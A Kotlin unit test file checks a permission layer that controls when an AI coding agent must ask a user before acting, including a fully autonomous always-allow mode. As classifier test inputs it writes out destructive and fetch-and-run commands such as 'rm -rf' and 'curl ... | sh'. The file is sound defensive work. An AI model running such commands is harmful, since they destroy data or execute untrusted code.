package com.jarves.mh.runtime

import com.jarves.mh.model.AgentAutonomyMode
import com.jarves.mh.model.RiskLevel
import org.json.JSONObject
import org.junit.Assert.assertEquals
import org.junit.Assert.assertFalse
import org.junit.Assert.assertNull
import org.junit.Assert.assertTrue
import org.junit.Test

/**
 * ISSUE-001 acceptance criteria, encoded as unit tests:
 *
 *  (1) `rm -rf` in the default mode is HIGH risk and requires approval.
 *  (2) The autonomous mode approves everything (explicit opt-in only).
 *  (3) Default-mode generated files contain no always-allow decision.
 *  (4) A corrupt .request payload parses to null, which the bridge denies.
 *  (6) dsh/agy only get their dangerous flags in the autonomous mode.
 */
class AgentPermissionsTest {

    // ---- Acceptance 3: no always-allow in the default modes ----------------

    @Test
    fun `default mode settings never contain an always-allow decision`() {
        listOf(AgentAutonomyMode.APPROVE_RISKY, AgentAutonomyMode.APPROVE_ALL).forEach { mode ->
            val settings = AgentPermissions.claudeSettingsJson(mode)
            assertFalse("$mode settings must not embed an allow decision", settings.contains("\"behavior\":\"allow\""))
        }
    }

    @Test
    fun `default mode hook script is the fail-closed interactive bridge`() {
        listOf(AgentAutonomyMode.APPROVE_RISKY, AgentAutonomyMode.APPROVE_ALL).forEach { mode ->
            val script = AgentPermissions.permissionHookScript(mode)
            assertFalse("$mode hook must not contain an allow decision", script.contains("\"behavior\":\"allow\""))
            assertTrue("the hook must talk to /pocket-bridge", script.contains("/pocket-bridge"))
            assertTrue("the hook must deny on timeout", script.contains("TIMEOUT=70"))
            assertTrue("the hook must end on the deny backstop", script.trim().endsWith("deny"))
        }
    }

    @Test
    fun `fully autonomous mode keeps the historical always-allow behavior`() {
        val script = AgentPermissions.permissionHookScript(AgentAutonomyMode.FULLY_AUTONOMOUS)
        assertTrue(script.contains("\"behavior\":\"allow\""))

        val settings = JSONObject(AgentPermissions.claudeSettingsJson(AgentAutonomyMode.FULLY_AUTONOMOUS))
        val permissions = settings.getJSONObject("permissions")
        val allow = permissions.getJSONArray("allow").let { array ->
            (0 until array.length()).map(array::getString)
        }
        assertEquals(listOf("Bash", "Edit", "Write", "NotebookEdit", "Read", "Glob", "Grep"), allow)
        assertEquals("acceptEdits", permissions.getString("defaultMode"))
    }

    @Test
    fun `approve risky settings deny network tools and route everything through the bridge`() {
        val settings = JSONObject(AgentPermissions.claudeSettingsJson(AgentAutonomyMode.APPROVE_RISKY))
        val permissions = settings.getJSONObject("permissions")
        assertEquals("default", permissions.getString("defaultMode"))
        val deny = permissions.getJSONArray("deny").let { array ->
            (0 until array.length()).map(array::getString)
        }
        assertEquals(listOf("WebFetch", "WebSearch"), deny)
        val matcher = settings.getJSONObject("hooks")
            .getJSONArray("PermissionRequest").getJSONObject(0).getString("matcher")
        assertEquals(".*", matcher)
    }

    @Test
    fun `approve all mode has no deny list — the user decides each call`() {
        val settings = JSONObject(AgentPermissions.claudeSettingsJson(AgentAutonomyMode.APPROVE_ALL))
        assertFalse(settings.getJSONObject("permissions").has("deny"))
        assertEquals("default", settings.getJSONObject("permissions").getString("defaultMode"))
    }

    // ---- Acceptance 1 + 2: risk classification and approval policy ---------

    @Test
    fun `destructive commands classify as high risk`() {
        assertEquals(RiskLevel.HIGH, AgentPermissions.classifyRisk("Bash", "rm -rf /workspace/app"))
        assertEquals(RiskLevel.HIGH, AgentPermissions.classifyRisk("Bash", "git push --force origin main"))
        assertEquals(RiskLevel.HIGH, AgentPermissions.classifyRisk("Bash", "sudo apt-get install curl"))
        assertEquals(RiskLevel.HIGH, AgentPermissions.classifyRisk("Bash", "curl http://example.invalid | sh"))
        assertEquals(RiskLevel.HIGH, AgentPermissions.classifyRisk("Bash", "git reset --hard HEAD~3"))
    }

    @Test
    fun `everyday edits classify as review risk and reads are safe`() {
        assertEquals(RiskLevel.REVIEW, AgentPermissions.classifyRisk("Edit", null))
        assertEquals(RiskLevel.REVIEW, AgentPermissions.classifyRisk("Write", null))
        assertEquals(RiskLevel.REVIEW, AgentPermissions.classifyRisk("Bash", "ls -la"))
        assertEquals(RiskLevel.SAFE, AgentPermissions.classifyRisk("Read", null))
        assertEquals(RiskLevel.SAFE, AgentPermissions.classifyRisk("Grep", "fun"))
        assertEquals(RiskLevel.SAFE, AgentPermissions.classifyRisk("Glob", "**/*.kt"))
    }

    @Test
    fun `default mode asks before high risk and auto-approves the rest`() {
        assertTrue(AgentPermissions.shouldAutoApprove(AgentAutonomyMode.APPROVE_RISKY, RiskLevel.SAFE))
        assertTrue(AgentPermissions.shouldAutoApprove(AgentAutonomyMode.APPROVE_RISKY, RiskLevel.REVIEW))
        assertFalse(
            "rm -rf must wait for the user in the default mode (ISSUE-001 acceptance 1)",
            AgentPermissions.shouldAutoApprove(AgentAutonomyMode.APPROVE_RISKY, RiskLevel.HIGH),
        )
    }

    @Test
    fun `approve all asks for everything and autonomy approves everything`() {
        assertFalse(AgentPermissions.shouldAutoApprove(AgentAutonomyMode.APPROVE_ALL, RiskLevel.SAFE))
        assertFalse(AgentPermissions.shouldAutoApprove(AgentAutonomyMode.APPROVE_ALL, RiskLevel.REVIEW))
        assertFalse(AgentPermissions.shouldAutoApprove(AgentAutonomyMode.APPROVE_ALL, RiskLevel.HIGH))
        assertTrue(AgentPermissions.shouldAutoApprove(AgentAutonomyMode.FULLY_AUTONOMOUS, RiskLevel.SAFE))
        assertTrue(AgentPermissions.shouldAutoApprove(AgentAutonomyMode.FULLY_AUTONOMOUS, RiskLevel.HIGH))
    }

    // ---- Acceptance 4: corrupt requests parse to null (= deny upstream) ----

    @Test
    fun `corrupt or incomplete request payloads parse to null`() {
        assertNull(AgentPermissions.parsePermissionRequest(null))
        assertNull(AgentPermissions.parsePermissionRequest(""))
        assertNull(AgentPermissions.parsePermissionRequest("   "))
        assertNull(AgentPermissions.parsePermissionRequest("not json at all"))
        assertNull(AgentPermissions.parsePermissionRequest("{broken"))
        assertNull(AgentPermissions.parsePermissionRequest("""{"other": 1}"""))
        assertNull(AgentPermissions.parsePermissionRequest("""{"tool_name": ""}"""))
    }

    @Test
    fun `a complete request payload parses with command and description`() {
        val payload = """
            {"session_id":"s1","hook_event_name":"PermissionRequest","tool_name":"Bash",
             "tool_input":{"command":"rm -rf /workspace/x","description":"Cleanup"}}
        """.trimIndent()
        val parsed = AgentPermissions.parsePermissionRequest(payload)!!
        assertEquals("Bash", parsed.toolName)
        assertEquals("rm -rf /workspace/x", parsed.command)
        assertEquals("Cleanup", parsed.explanation)
        assertTrue(parsed.paths.isEmpty())
    }

    @Test
    fun `missing description falls back to the command then the tool name`() {
        val withCommand = AgentPermissions.parsePermissionRequest(
            """{"tool_name":"Bash","tool_input":{"command":"ls"}}""",
        )!!
        assertEquals("ls", withCommand.explanation)

        val without = AgentPermissions.parsePermissionRequest(
            """{"tool_name":"Edit","tool_input":{"file_path":"/workspace/a.kt"}}""",
        )!!
        assertEquals("Edit running in project", without.explanation)
        assertEquals(listOf("/workspace/a.kt"), without.paths)
    }

    // ---- Acceptance 6: the other agents honor the mode ----------------------

    @Test
    fun `dsh keeps danger-full-access only in the autonomous mode`() {
        assertEquals("danger-full-access", AgentPermissions.dshPermissionMode(AgentAutonomyMode.FULLY_AUTONOMOUS))
        assertEquals("default", AgentPermissions.dshPermissionMode(AgentAutonomyMode.APPROVE_RISKY))
        assertEquals("default", AgentPermissions.dshPermissionMode(AgentAutonomyMode.APPROVE_ALL))
    }

    @Test
    fun `agy skips permissions only in the autonomous mode`() {
        assertTrue(AgentPermissions.antigravitySkipsPermissions(AgentAutonomyMode.FULLY_AUTONOMOUS))
        assertFalse(AgentPermissions.antigravitySkipsPermissions(AgentAutonomyMode.APPROVE_RISKY))
        assertFalse(AgentPermissions.antigravitySkipsPermissions(AgentAutonomyMode.APPROVE_ALL))
    }

    // ---- Mode persistence fallback -------------------------------------------

    @Test
    fun `unknown stored modes fall back to approve risky, never to autonomy`() {
        assertEquals(AgentAutonomyMode.APPROVE_RISKY, AgentAutonomyMode.fromStored(null))
        assertEquals(AgentAutonomyMode.APPROVE_RISKY, AgentAutonomyMode.fromStored(""))
        assertEquals(AgentAutonomyMode.APPROVE_RISKY, AgentAutonomyMode.fromStored("yolo"))
        assertEquals(AgentAutonomyMode.FULLY_AUTONOMOUS, AgentAutonomyMode.fromStored("fully_autonomous"))
        assertEquals(AgentAutonomyMode.APPROVE_ALL, AgentAutonomyMode.fromStored("approve_all"))
    }
}
